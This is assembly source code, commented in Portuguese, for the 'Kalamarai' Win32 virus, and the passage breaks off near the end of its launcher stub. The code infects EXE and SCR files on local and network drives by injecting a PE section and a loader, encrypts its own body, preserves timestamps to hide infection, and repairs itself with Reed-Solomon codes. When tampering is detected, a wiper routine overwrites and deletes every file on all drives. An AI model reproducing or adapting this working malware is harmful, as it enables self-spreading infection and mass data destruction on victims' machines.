   ;Kalamarai virus - Um caso cl ssico de personalidade dupla ;)

   ;Este virus pode corrigir at‚ 90 bytes linearmente modificados a cada ciclo,
   ;usando uma rotina de ECC Reed-Solomon, portanto, tentativas de modificar o
   ;codigo residente sÆo futeis, e perigosas, pois se o virus nÆo consegue
   ;corrigir todas as modifica‡äes(mais de 90 bytes), deleta todos os arquivos
   ;de todos os discos. O virus ‚ encriptado usando MUL/DIV, obtem as APIs
   ;diretamente da ImportTable do hospedeiro, e cria uma thread paralela para se
   ;executar. O virus busca recursivamente todos os discos por arquivos PE de
   ;extensÆo EXE e SCR.

   ;Aten‡Æo: NÆo modifique! O c¢digo sempre deve ser multiplo de 249!

   .386p
   .model flat

   RELOCS EQU 094h

   ofs    equ offset
   by     equ byte ptr
   wo     equ word ptr
   dwo    equ dword ptr

   .xlist
   include pe.inc
   include mz.inc
   include win32api.inc
   include useful.inc
   .list

   .data

   v_ini:
          mov esi, ?
        vofs equ dwo $-4
          add esi, [esp+4]                         ;parƒmetro da thread=reloc
          mov edi, esi
          mov ecx, (ofs v_fim-ofs entrada)/4
          mov ebx, ?
        chave equ dwo $-4
     desencripta:
          sub edx, edx
          lodsd
          mul ebx
          add eax, [esi]
          stosd                                    ;dword1*key+dword2
          lodsd
          loop desencripta
     entrada:
          cld                                      ;entrada da primeira gera‡Æo
          call delta
     delta:
          pop ebp
          lea esi, [ebp+(ofs reloctable-ofs delta)]
          mov edi, ebp
          sub edi, (ofs delta-ofs v_ini)          ;edi=inicio do virus
          sub ebp, ofs delta
          mov ecx, ?                               ;ebp=diferen‡a do offset original
        numeroreloc equ $-4
     arruma:
          sub eax, eax
          lodsw
          not ax                                   ;encripta‡Æo leve
          add [edi+eax], ebp                       ;arruma ponteiro
          loop arruma
          mov eax, ?
     GMHA equ dwo $-4                              ;ponteiro para a ImportTable
          add eax, [esp+4]
          push ofs kernel32
          call [eax]
          mov ebp, eax                             ;ebp=kernel32 module handle
          mov ebx, ?
     GPA equ dwo $-4                               ;ponteiro para a ImportTable
          add ebx, [esp+4]
          mov esi, ofs kernel32API
          mov edi, ofs CreateThread_
     proximaAPI:
          cmp by [esi], 0                          ;todas as APIs obtidas?
          je feito
          push esi
          push ebp
          call [ebx]                               ;pega endere‡o
          stosd
          @endsz                                   ;busca inicio da proxima API
          jmp proximaAPI
     feito:
          call dwo [GetTickCount]
          xor [chave], eax                         ;escolhe chave de encripta‡Æo
          or  dwo [chave], 00000000001000001010101000000001b
          and dwo [chave], 00000000001111111111111111111111b
          push eax
          push ofs corrige                         ;rotina para evitar modifica‡äes
          call cria_thread
          mov eax, [thread_id]
          mov [thread_corrige], eax
     di_novo:
          push ofs infecta_pe                      ;rotina para chamar a cada arquivo
          push ofs busca_recursiva
          call cria_thread
          push 60*60*1000
          call dwo [Sleep2]                        ;dorme por 1 hora
          jmp di_novo

   cria_tabela:
          call calcula_crc
          mov [crc32], eax                         ;salva not(crc32) do virus
          mov ebp, [tabela]
          sub ecx, ecx
     constroi:                                     ;ecx=parƒmetro
          call constroi_bloco                      ;esi=6 bytes de CCE
          imul eax, ecx, 6
          lea edi, [ebp+eax]                       ;posi‡Æo no buffer
          movsd
          movsw                                    ;salva codigo para este bloco
          inc cl
          cmp cl, BLOCOS                           ;proximo bloco
          jne constroi
          ret

   fode_tudo:
          pushad
          sub esi, esi
          mov ebp, [esp+(8*4)+4]
          push FILE_ATTRIBUTE_NORMAL
          push ebp
          call dwo [SetFileAttributesA]            ;remove atributos do arquivo
          test eax, eax
          jz deleta_igual
          push esi
          push FILE_ATTRIBUTE_NORMAL
          push TRUNCATE_EXISTING
          push esi
          push esi
          push GENERIC_WRITE
          push ebp
          call dwo [CreateFileA]                   ;sobreescreve arquivo
          inc eax
          jz deleta_igual
          dec eax
          push eax                                 ;argumento para fechar
          push esi
          push ofs temp
          push ofs fim_mensagem-ofs mensagem
          push ofs mensagem
          push eax                                 ;escreve nossa mensagem
          call dwo [WriteFile]
          call dwo [CloseHandle]                   ;fecha arquivo
     deleta_igual:
          push ebp
          call dwo [DeleteFileA]                   ;detona arquivo
     nao_e:
          popad
          ret 4

   mensagem db "never touch the kala-marai!", 0
   fim_mensagem equ $

   infecta_pe:
          pushad
          mov esi, [esp+(8*4)+4]
          push esi
          call dwo [lstrlen]
          mov eax, dwo [esi+eax-4]
          and eax, not 20202000h
          cmp eax, "EXE."                          ;extensÆo ‚ valida pra infe‡Æo?
          je detona
          cmp eax, "RCS."
          jne nao_e
     detona:
          push esi
          call infecta_arquivo                     ;manda bala!
          jmp nao_e

   para_correcao:
          pushad
     segura:
          mov ecx, [espera]                        ;nÆo podemos mexer em nada...
          jecxz segura
          push dwo [thread_corrige]
          call dwo [SuspendThread]                 ;segura thread que corrige
          mov ecx, [esp+(8*4)]
          cmp by [ecx], 0cch
          je mexeu_pagou                           ;breakpoint esperando?
     volta:
          popad
          ret

   segue_correcao:
          pushad
          call cria_tabela
          push dwo [thread_corrige]                ;continua thread de corre‡Æo
          call dwo [ResumeThread]
          jmp volta                                ;temos que economizar bytes...

   corrige:
          pushad
          mov dwo [espera], 1
   BLOCOS = (ofs final_virus-ofs v_ini)/249
          push PAGE_READWRITE
          push MEM_RESERVE+MEM_COMMIT
          push (BLOCOS*6)+249+256
          push 0
          call dwo [VirtualAlloc]
          mov [tabela], eax
          test eax, eax                            ;nÆo h  memoria suficiente...
          jz deu_merda
          call cria_tabela                         ;cria corre‡Æo e crc32
     verifica_virus:
          call calcula_crc
          xor eax, [crc32]
          jz verifica_virus                        ;virus foi modificado?
          dec dwo [espera]                         ;corrigindo virus, p ra tudo
          sub ecx, ecx
     proximo_bloco:
          call constroi_bloco                      ;esi=6 bytes de CCE
          imul eax, ecx, 6
          lea edi, [ebp+eax]                       ;posi‡Æo no buffer
          cmpsd
          lahf
          cmpsw                                    ;compara codigo para este bloco
          jne e_este
          sahf
     e_este:
          je bloco_ok                              ;bloco foi modificado?
          sub esi, 6
          mov eax, [edi-6]
          mov [esi], eax
          mov ax, [edi-2]
          mov [esi+4], ax
          lea edi, [ebp+(BLOCOS*6)]                ;edi=buffer temporario
          push ecx
          push ofs temp
          push edi
          push esi
          call _rsdecode                           ;corrige
          add esp, 3*4
          pop ecx
          cmp dwo [temp], 3
          ja mexeu_pagou                           ;corrigiu todos os erros?
          sub edx, edx
     corrige_byte:
          imul eax, edx, BLOCOS
          mov bl, [edi+edx]
          mov [eax+ecx+ofs v_ini], bl              ;corrige byte
          inc dl
          cmp dl, 250
          jne corrige_byte
     bloco_ok:
          inc cl
          cmp cl, BLOCOS                           ;proximo bloco
          jne proximo_bloco
          inc dwo [espera]                         ;tudo volta ao normal...
          jmp verifica_virus
     mexeu_pagou:
          push ofs fode_tudo
          push ofs busca_recursiva
          call cria_thread                         ;ativa o virus!
          push MEM_RELEASE
          push 0
          push ebp
          call dwo [VirtualFree]                   ;libera memoria
     deu_merda:
          popad
          ret 4

   busca_recursiva:                                ;parƒmetro=rotina de arquivo
          pushad
          sub esp, 4
          mov ebp, esp
          mov [ebp], "\:@"                         ;inicia busca por A:\
     proximo_disco:
          cmp by [ebp], "Z"
          je tudo                                  ;se j  tamos no Z:\, para
          inc by [ebp]
          push ebp
          call dwo [GetDriveTypeA]
          cmp al, 3                                ;‚ disco rigido?
          je fixo
          cmp al, 4                                ;ou disco de rede?
          jne proximo_disco
     fixo:
          push ebp
          call dwo [SetCurrentDirectoryA]
          test eax, eax
          jz proximo_disco
          push dwo [esp+(8*4)+8]                   ;rotina CALLBACK
          call busca_disco                         ;busca dentro dos diret¢rios
          jmp proximo_disco
     tudo:
          add esp, 4                               ;todos os discos processados
          jmp deu_merda

   busca_disco:
          pushad
          sub esp, SIZEOF_WIN32_FIND_DATA+4+4+4
          mov ebp, esp
          mov dwo [ebp.SIZEOF_WIN32_FIND_DATA], "*.*" ;constroi m scara de busca
          mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4+4], ".." ;e para mudar de diret¢rio
          lea eax, [ebp.SIZEOF_WIN32_FIND_DATA]
          push ebp
          push eax
          call dwo [FindFirstFileA]
          mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4], eax ;salva handle da busca
          inc eax
          jz sobe_dir
     verifica_dir:
          lea eax, [ebp.WFD_szFileName]
          test dwo [ebp.WFD_dwFileAttributes], 10h
          jnz e_dir
          push eax
          mov eax, [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+8]
          call eax                                 ;chama CALLBACK
     continua_busca:
          push ebp
          push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
          call dwo [FindNextFileA]                 ;procura proximo arquivo
          test eax, eax
          jnz verifica_dir
     sobe_dir:
          push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
          call dwo [FindClose]
          lea eax, [ebp.SIZEOF_WIN32_FIND_DATA+4+4] ;ponteiro para ".."
          push eax
          call dwo [SetCurrentDirectoryA]
          add esp, SIZEOF_WIN32_FIND_DATA+4+4+4
          jmp deu_merda
     e_dir:
          cmp by [eax], '.'
          je continua_busca                        ;evita travar
          push eax
          call dwo [SetCurrentDirectoryA]          ;entra no diret¢rio
          test eax, eax
          jz continua_busca
          push dwo [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+4]
          call busca_disco                         ;busca recursiva
          jmp continua_busca

   cria_thread:
          push ofs temp
          push 4                                   ;CREATE_SUSPENDED
          push dwo [esp+(2*4)+8]                   ;parƒmetro
          push dwo [esp+(3*4)+4]                   ;rotina
          push 0
          push 0
          call dwo [CreateThread_]
          xchg ecx, eax
          jecxz deu_pau
          mov [thread_id], ecx
          push ecx
          push -15                                 ;THREAD_PRIORITY_IDLE
          push ecx
          call dwo [SetThreadPriority]
          call dwo [ResumeThread]
     deu_pau:
          ret 4*2

   .xlist
   include ECC\rslib.asm
   include ECC\gflib.asm
   .list

   calcula_crc:
          mov edx, ofs v_ini
          mov ecx, ofs crc32-ofs v_ini
          push not 0
          pop eax
     @@1:
          xor al, [edx]                            ;rotina de zhengxi
          inc edx
          mov bl, 8
     @@2:
          shr eax, 1
          jnc @@3
          xor eax, 0EDB88320h                      ;polinomio
     @@3:
          dec bl
          jnz @@2
          loop @@1
     @@4:                                          ;devolve not(crc32)
          ret

   loader:
          pushad
          sub eax, 12345678h
        entrypoint equ dwo $-4                     ;eax!=0 se arquivo foi relocado
          mov ebx, ?
        host_createthread equ dwo $-4              ;endere‡o de CreateThread na ImportTable
          mov ecx, ?                               ;entrada do desencriptador
        virus_pointer equ dwo $-4
          add ebx, eax
          add ecx, eax
          push esp
          push esp
          push 0
          push eax
          push ecx
          push 0
          push 0
          call [ebx]                               ;chama CreateThread
          pop eax
          popad
          db 0e9h                                  ;continua execu‡Æo no host
     endereco_host dd 0
   fim_loader equ $

   constroi_bloco:
          push ecx                                 ;salva contador de blocos
          sub edx, edx
          lea edi, [ebp+(BLOCOS*6)]                ;edi=buffer temporario
     proximo_byte:
          imul eax, edx, BLOCOS
          mov al, [eax+ecx+ofs v_ini]
          stosb
          inc dl
          cmp dl, 250
          jne proximo_byte                         ;constroi bloco de 249 bytes
          mov esi, edi
          sub edi, 250
          push esi
          push edi
          call _rsencode                           ;calcula c¢digo de corre‡Æo de erro
          add esp, 4*2
          pop ecx
          ret

   LOCAL_DATA EQU SIZE IMAGE_NT_HEADERS+4+(8*3)+(IMAGE_SIZEOF_SECTION_HEADER*10)

   infecta_arquivo:
          pushad
          sub esp, LOCAL_DATA
          mov ebp, esp
          push dwo [esp+(8*4)+4+LOCAL_DATA]
          call dwo [GetFileAttributesA]
          mov [ebp+SIZE IMAGE_NT_HEADERS], eax     ;salva atributos do arquivo
          inc eax
          jz puta_merda
          push FILE_ATTRIBUTE_NORMAL
          push dwo [esp+(8*4)+4+LOCAL_DATA+4]
          call dwo [SetFileAttributesA]            ;limpa atributos
          test eax, eax
          jz puta_merda
          push dwo [esp+(8*4)+4+LOCAL_DATA]
          call verifica
          inc eax
          jz ja_infectado
          push ebx                                 ;parƒmetro para CloseHandle
          lea esi, [ebp+SIZE IMAGE_NT_HEADERS+4]
          push esi
          lodsd
          lodsd                                    ;esi+=8
          push esi
          lodsd
          lodsd                                    ;esi+=8
          push esi
          push ebx
          call dwo [GetFileTime]                   ;salva FILETIME
          sub esi, esi
          mov dwo [infectou?], esi
          test eax, eax
          jz puta_que_pariu
          push esi
          push ofs temp
          push SIZE IMAGE_NT_HEADERS
          push ebp
          push ebx
          call dwo [ReadFile]                      ;lˆ PE header
          test eax, eax
          jz fudeu
          xor [temp], SIZE IMAGE_NT_HEADERS
          jnz fudeu
          cmp [ebp.NT_Signature], IMAGE_NT_SIGNATURE
          jne fudeu                                ;‚ PE de veras?
          mov ecx, dwo [ebp.NT_FileHeader.FH_Machine]
          cmp cx, IMAGE_FILE_MACHINE_I386
          jne fudeu                                ;roda em Intel 386+
          shr ecx, 16
          cmp cl, 9                                ;arquivo tem se‡äes demais...
          jae fudeu
          mov ax, [ebp.NT_FileHeader.FH_Characteristics]
          not al
          test ax, IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_DLL
          jnz fudeu                                ;nÆo ‚ DLL mas ‚ executavel
          mov eax, ecx
          shl eax, 5                               ;eax*=32
          shl ecx, 3                               ;ecx*=8
          add ecx, eax                             ;ecx=eax*40
          mov [tsecao], ecx                        ;salva tamanho das SectionHeaders
          lea esi, [ebp+SIZE IMAGE_NT_HEADERS+4+(8*3)]
          push 0
          push ofs temp
          push ecx
          push esi
          push ebx
          call dwo [ReadFile]                      ;lˆ SectionHeaders
          mov eax, [esi.SH_PointerToRawData]
          sub eax, [pe_ptr]
          sub eax, [tsecao]
          cmp eax, IMAGE_SIZEOF_SECTION_HEADER+SIZE IMAGE_NT_HEADERS
          jb fudeu                                 ;nÆo tem espa‡o pra nova se‡Æo
          mov eax, [ebp.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size]
          test eax, eax
          jz fudeu                                 ;nÆo tem ImportTable?
          mov edi, [ebp.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
          add edi, -IMAGE_SIZEOF_IMPORT_DESCRIPTOR
     proxima_dll:
          add edi, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
          lea esi, [edi.ID_Name]
          call le4                                 ;lˆ ponteiro pro nome da DLL
          jc fudeu
          mov esi, eax
          call le8                                 ;pega 8 bytes do nome
          jc fudeu
          and eax, not 20202020h
          and ecx, not 00002020h                   ;passa nome da dll pra maiusculas
          xor eax, "NREK"
          jnz proxima_dll
          xor ecx, "23LE"                          ;verifica se ‚ a malvada
          jnz proxima_dll
          mov esi, edi                             ;[edi.ID_Characteristics]
          call le4
          jc fudeu
          push eax
          lea esi, [edi.ID_FirstThunk]
          call le4
          pop esi                                  ;esi=lista de nomes
          test eax, eax
          jz fudeu
          mov edi, eax
          test esi, esi                            ;existe uma HintTable?
          jnz nomes_separados
          mov esi, edi                             ;nÆo, ‚ tudo o mesmo
     nomes_separados:
          add edi, [ebp.NT_OptionalHeader.OH_ImageBase] ;edi=ponteiros no EXE
          call para_correcao
          sub eax, eax
          mov [GMHA], eax
          mov [GPA], eax                           ;limpa endere‡os
          mov [host_createthread], eax
     le_nome:
          call le4
          jc  ve_se_deu
          test eax, eax                            ;j  foram todas as APIs?
          jz ve_se_deu
          push esi
          lea esi, [eax+2]                         ;pula ordinal order
          call le8
          jc le_proxima
          cmp eax, "MteG"                          ;verifica se ‚ GetModuleHandleA
          jne ve_gpa
          cmp ecx, "ludo"
          jne le_proxima                           ;GetModul????dleA
          add esi, 8
          call le8
          jc le_proxima
          cmp ecx, "Aeld"
          jne le_proxima
          mov [GMHA], edi
          jmp le_proxima
     ve_gpa:
          cmp eax, "PteG"                          ;verifica se ‚ GetProcAddress
          jne ve_ct
          cmp ecx, "Acor"
          jne le_proxima                           ;GetProcA????
          mov [GPA], edi
          jmp le_proxima
     ve_ct:
          cmp eax, "aerC"                          ;verifica CreateThread
          jne le_proxima
          cmp ecx, "hTet"
          jne le_proxima
          add esi, 8
          call le4
          jc le_proxima
          cmp eax, "daer"
          jne le_proxima
          mov [host_createthread], edi
          jmp le_proxima
     le_proxima:
          pop esi
          add esi, 4                               ;verifica proxima API do host
          add edi, 4
          jmp le_nome
     ve_se_deu:
          sub eax, eax
          cmp [GMHA], eax
          jz fudeu
          cmp [GPA], eax                           ;todas 3 APIs foram obtidas?
          jz fudeu
          cmp [host_createthread], eax
          jz fudeu
          inc wo [ebp.NT_FileHeader.FH_NumberOfSections]
          lea esi, [ebp+(SIZE IMAGE_NT_HEADERS+4+(8*3))-IMAGE_SIZEOF_SECTION_HEADER]
          mov ecx, (ofs fim_loader-ofs loader)
          mov eax, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_SizeOfRawData]
          mov edx, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize]
          sub eax, edx
          jbe fudeu
          cmp eax, ecx
          jbe fudeu                                ;pouco espa‡o de "slack"
          push edx                                 ;edx=tamanho da primeira se‡Æo
          add edx, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_PointerToRawData]
          mov [lugarloader], edx
          pop edx
          add [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize], ecx ;aumenta pro loader
          add edx, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress]
          mov eax, [ebp.NT_OptionalHeader.OH_AddressOfEntryPoint]
          test eax, eax                            ;entrypoint=0
          jz fudeu
          mov [ebp.NT_OptionalHeader.OH_AddressOfEntryPoint], edx
          sub eax, edx                             ;calcula salto relativo
          sub eax, (ofs fim_loader-ofs loader)
          add edx, [ebp.NT_OptionalHeader.OH_ImageBase]
          mov [entrypoint], edx
          mov [endereco_host], eax
          call segue_correcao
          mov edx, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress]
          add esi, [tsecao]
          add [tsecao], IMAGE_SIZEOF_SECTION_HEADER
          lea edi, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_Name]
          mov eax, [chave]
          push eax
          and eax, 0f0f0f0fh
          add eax, "AAAA"
          stosd
          pop eax
          ror eax, 17
          and eax, 0f0f0f0fh                       ;inicia cria‡Æo da nova se‡Æo
          add eax, "AAAA"
          stosd
          mov [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_Characteristics], IMAGE_SCN_MEM_WRITE + \
              IMAGE_SCN_MEM_READ + IMAGE_SCN_CNT_INITIALIZED_DATA
          mov eax, [esi.SH_SizeOfRawData]
          add eax, [esi.SH_PointerToRawData]
          call alinha_file
          mov [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_PointerToRawData], eax
          mov [escreve], eax                       ;onde vamos escrever o virus
          mov eax, [esi.SH_VirtualSize]
          add eax, [esi.SH_VirtualAddress]
          call alinha_mem
          mov [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress], eax
          add eax, [ebp.NT_OptionalHeader.OH_ImageBase]
          call para_correcao
          mov [virus_pointer], eax
          add eax, ofs entrada-ofs v_ini
          mov [vofs], eax                          ;onde vai estar o codigo encriptado
          call segue_correcao
          mov eax, (ofs v_fim-ofs v_ini)*2
          push eax
          call alinha_file
          mov [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_SizeOfRawData], eax
          add eax, [escreve]
          mov [tamanho_total], eax                 ;tamanho final do arquivo
          pop eax
          call alinha_mem
          mov [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualSize], eax
          add eax, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress]
          add eax, edx
          call alinha_mem
          cmp [ebp.NT_OptionalHeader.OH_SizeOfImage], eax
          jae ja_ta                                ;arquivo j  ‚ grande suficiente?
          mov [ebp.NT_OptionalHeader.OH_SizeOfImage], eax
     ja_ta:
          mov [ebp.NT_OptionalHeader.OH_CheckSum], 0
          inc dwo [infectou?]
          mov eax, [pe_ptr]
          sub eax, 4
          push 0
          push 0
          push eax
          push ebx                                 ;vai at‚ PE header-4
          call dwo [SetFilePointer]
          push 0
          push ofs temp
          push 4
          push ofs marca
          push ebx                                 ;escreve marca de infe‡Æo
          call dwo [WriteFile]
          push 0
          push ofs temp
          push SIZE IMAGE_NT_HEADERS
          push ebp
          push ebx                                 ;escreve pe header modificado
          call dwo [WriteFile]
          lea esi, [ebp+SIZE IMAGE_NT_HEADERS+4+(8*3)]
          push 0
          push ofs temp
          push [tsecao]
          push esi
          push ebx                                 ;escreve SectionHeaders
          call dwo [WriteFile]
          push 0
          push 0
          push [lugarloader]
          push ebx                                 ;vai pro final da 1§ se‡Æo
          call dwo [SetFilePointer]
          push 0
          push ofs temp
          push (ofs fim_loader-ofs loader)
          push ofs loader
          push ebx                                 ;escreve o loader
          call dwo [WriteFile]
          push PAGE_READWRITE
          push MEM_RESERVE+MEM_COMMIT
          push (ofs v_fim-ofs v_ini)*4             ;pega memoria pra encriptar virus
          push 0
          call dwo [VirtualAlloc]
   ;       test eax, eax                           ;se falhar, fudeu pra valer!
   ;       jz $
          push MEM_RELEASE
          push 0
          push eax                                 ;parƒmetros pra liberar memoria
          mov edi, eax
          mov esi, ofs v_ini
          mov ecx, (ofs entrada-ofs v_ini)
          rep movsb                                ;copia desencriptador
          push ebx                                 ;salva handle do arquivo
          mov ecx, (ofs v_fim-ofs entrada)/4
          mov ebx, [chave]
     encripta:
          sub edx, edx
          lodsd
          div ebx
          stosd                                    ;guarda quociente
          mov eax, edx
          stosd                                    ;guarda resto
          loop encripta
          pop ebx
          push 0
          push 0
          push [escreve]
          push ebx                                 ;vai pra nossa se‡Æo
          call dwo [SetFilePointer]
          push 0
          push ofs temp
          push ((ofs v_fim-ofs entrada)*2+(ofs entrada-ofs v_ini))
          push dwo [esp+(3*4)]
          push ebx                                 ;escreve o virus
          call dwo [WriteFile]
          call dwo [VirtualFree]                   ;libera memoria
          push 0
          push 0
          push [tamanho_total]
          push ebx                                 ;vai at‚ novo final
          call dwo [SetFilePointer]
          push ebx                                 ;marca final do arquivo
          call dwo [SetEndOfFile]
     fudeu:
          lea esi, [ebp+SIZE IMAGE_NT_HEADERS+4]
          push esi
          lodsd
          xor [rnd], eax
          lodsd
          push esi                                 ;esi+=8
          lodsd
          lodsd
          xor [rnd], eax
          push esi                                 ;esi+=8
          push ebx
          call dwo [SetFileTime]                   ;restaura FILETIME
     puta_que_pariu:
          call dwo [CloseHandle]
          mov ecx, [infectou?]
          jecxz ja_infectado
          push 20*1000
          call dwo [Sleep2]                        ;se infectou, descansa um pouco
     ja_infectado:
          push dwo [ebp+SIZE IMAGE_NT_HEADERS]
          push dwo [esp+(8*4)+4+LOCAL_DATA+4]
          call dwo [SetFileAttributesA]            ;restaura atributos
     puta_merda:
          add esp, LOCAL_DATA
          popad
          ret 4

   le4:
          push 0
          push esp                                 ;buffer
          push esi                                 ;rva para ler
          push 4                                   ;tamanho da leitura
          call le_rva
          pop eax
          ret

   le8:
          push 0
          push 0
          push esp                                 ;buffer
          push esi                                 ;rva para ler
          push 8                                   ;tamanho da leitura
          call le_rva
          pop eax
          pop ecx
          ret

   le_rva:
          pushad
          lea esi, [ebp+(SIZE IMAGE_NT_HEADERS+4+(8*3))]
          movzx ecx, wo [ebp.NT_FileHeader.FH_NumberOfSections]
     proximo_header:
          mov eax, [esp+(8*4)+8]
          sub eax, [esi.SH_VirtualAddress]         ;tira base da se‡Æo do rva
          jc caralho
          cmp eax, [esi.SH_VirtualSize]            ;aponta dentro?
          jb converte
     caralho:
          add esi, IMAGE_SIZEOF_SECTION_HEADER
          loop proximo_header
     erro:
          stc
     pula_stc:
          popad
          ret 3*4
     converte:
          add eax, [esi.SH_PointerToRawData]       ;some inicio da se‡Æo
          push 0
          push 0
          push eax
          push ebx
          call dwo [SetFilePointer]                ;ajusta ponteiro
          inc eax
          jz erro
          push 0
          push ofs temp
          push dwo [esp+(8*4)+4+(2*4)]
          push dwo [esp+(8*4)+12+(3*4)]
          push ebx
          call dwo [ReadFile]                      ;le valor
          test eax, eax
          jz erro
          jmp pula_stc

   alinha_file:
          push ecx
          mov ecx, [ebp.NT_OptionalHeader.OH_FileAlignment]
          jmp alinha

   alinha_mem:
          push ecx
          mov ecx, [ebp.NT_OptionalHeader.OH_SectionAlignment]
     alinha:
          dec ecx
          add eax, ecx
          not ecx
          and eax, ecx
          pop ecx
          ret

   verifica:
          pushad
          sub esp, IMAGE_SIZEOF_DOS_HEADER
          mov ebp, esp
          sub esi, esi
          mov dwo [esp+IMAGE_SIZEOF_DOS_HEADER.Pushad_eax], -1 ;sinaliza erro
          push esi
          push FILE_ATTRIBUTE_NORMAL
          push OPEN_EXISTING
          push esi
          push esi
          push GENERIC_READ+GENERIC_WRITE
          push dwo [esp+(8*4)+(6*4)+4+IMAGE_SIZEOF_DOS_HEADER]
          call dwo [CreateFileA]
          mov ebx, eax
          inc eax
          jz nao_deu
          push ebx                                 ;parƒmetro para CloseHandle
          push esi
          push ofs temp
          push IMAGE_SIZEOF_DOS_HEADER
          push ebp
          push ebx
          call dwo [ReadFile]
          test eax, eax
          jz fecha_arquivo
          xor dwo [temp], IMAGE_SIZEOF_DOS_HEADER
          jnz fecha_arquivo
          xor wo [ebp], IMAGE_DOS_SIGNATURE
          jnz fecha_arquivo                        ;‚ um arquivo EXE?
          mov eax, [ebp.MZ_lfanew]
          mov [pe_ptr], eax
          add eax, -4
          push esi
          push esi
          push eax
          push ebx                                 ;vai at‚ PE header-4
          call dwo [SetFilePointer]
          inc eax
          jz fecha_arquivo
          push esi
          push ofs temp
          push 4                                   ;lˆ 1 dword
          push ebp
          push ebx
          call dwo [ReadFile]
          test eax, eax
          jz fecha_arquivo
          xor dwo [temp], 4
          jnz fecha_arquivo
          xor dwo [ebp], 12345678h
        org $-4
     marca dd -1
          jz fecha_arquivo
          mov dwo [esp+IMAGE_SIZEOF_DOS_HEADER.Pushad_eax+4], 0 ;sinaliza nÆo infectado
          pop dwo [esp+IMAGE_SIZEOF_DOS_HEADER.Pushad_ebx] ;salva e remove handle
          jmp nao_deu
     fecha_arquivo:
          call dwo [CloseHandle]
     nao_deu:
          sub esp, -IMAGE_SIZEOF_DOS_HEADER
          popad
          ret 4

   reloctable     dw RELOCS dup ("Re")

   kernel32       db "KERNEL32.DLL", 0

   kernel32API    db "CreateThread", 0
                  db "CreateFileA", 0
                  db "CloseHandle", 0
                  db "VirtualAlloc", 0
                  db "SetThreadPriority", 0
                  db "ResumeThread", 0
                  db "ReadFile", 0
                  db "SetFilePointer", 0
                  db "GetFileTime", 0
                  db "SetFileTime", 0
                  db "GetFileAttributesA", 0
                  db "SetFileAttributesA", 0
                  db "WriteFile", 0
                  db "SetEndOfFile", 0
                  db "VirtualFree", 0
                  db "GetTickCount", 0
                  db "GetDriveTypeA", 0
                  db "SetCurrentDirectoryA", 0
                  db "FindFirstFileA", 0
                  db "FindNextFileA", 0
                  db "FindClose", 0
                  db "lstrlen", 0
                  db "Sleep", 0
                  db "DeleteFileA", 0
                  db "SuspendThread", 0
                  db 0

   ;org 01D2Ah
   crc32  dd "CRC-"                                 ;alinhado num multiplo de 249

   final_virus equ $

   temp           dd ?
   pe_ptr         dd ?
   tsecao         dd ?
   lugarloader    dd ?
   escreve        dd ?
   tamanho_total  dd ?
   rnd            dd ?
   thread_id      dd ?
   thread_corrige dd ?
   tabela         dd ?
   espera         dd ?
   infectou?      dd ?

   CreateThread_  dd ?
   CreateFileA    dd ?
   CloseHandle    dd ?
   VirtualAlloc   dd ?
   SetThreadPriority dd ?
   ResumeThread   dd ?
   ReadFile       dd ?
   SetFilePointer dd ?
   GetFileTime    dd ?
   SetFileTime    dd ?
   GetFileAttributesA dd ?
   SetFileAttributesA dd ?
   WriteFile      dd ?
   SetEndOfFile   dd ?
   VirtualFree    dd ?
   GetTickCount   dd ?
   GetDriveTypeA  dd ?
   SetCurrentDirectoryA dd ?
   FindFirstFileA dd ?
   FindNextFileA  dd ?
   FindClose      dd ?
   lstrlen        dd ?
   Sleep2         dd ?
   DeleteFileA    dd ?
   SuspendThread  dd ?

   align 4

   v_fim   equ this byte                           ;final do codigo viral


   _GMHA  dd 0
   _GPA   dd 0                                     ;variaveis usadas pelo stub
   tempo  dd 0

   .code

   start:
          push 4                                   ;stub do virus
          @pushsz "Virus KalaMarai"
          @pushsz "Deseja continuar?"
          push 0
    extrn MessageBoxA:PROC
          call MessageBoxA
          cmp al, 6                                ;confirma execu‡Æo do virus
          je vaila
     saifora:
          push 0
    extrn ExitProcess:PROC
          call ExitProcess                         ;ihhh... usu rio amarelou!
     vaila:
    extrn GetModuleHandleA:PROC
          mov eax, ofs GetModuleHandleA
          mov [_GMHA], eax                         ;salva ponteiros para APIs essenciais
          mov eax, ofs _GMHA
          mov [GMHA], eax
    extrn GetProcAddress:PROC
          mov eax, ofs GetProcAddress
          mov [_GPA], eax
          mov eax, ofs _GPA
          mov [GPA], eax
   BASE=00400000h
          mov ebp, BASE                            ;ebp=imagebase
          mov esi, [ebp.MZ_lfanew]
          add esi, ebp                             ;esi=pe header
          mov ecx, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_Size]
          mov esi, [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress]
          add esi, ebp                             ;esi=reloca‡äes
          lea edx, [esi+ecx]                       ;edx=limite
          mov edi, ofs reloctable
     reloca:
          cmp dwo [esi], ofs v_ini-BASE            ;bloco aponta para o virus?
          jnb aponta
          add esi, [esi+4]                         ;nÆo, pega proximo bloco
          cmp esi, edx
          jb reloca                                ;ainda existem reloca‡äes?
          push (ofs v_fim-ofs v_ini)
          push 40h
    extrn GlobalAlloc:PROC
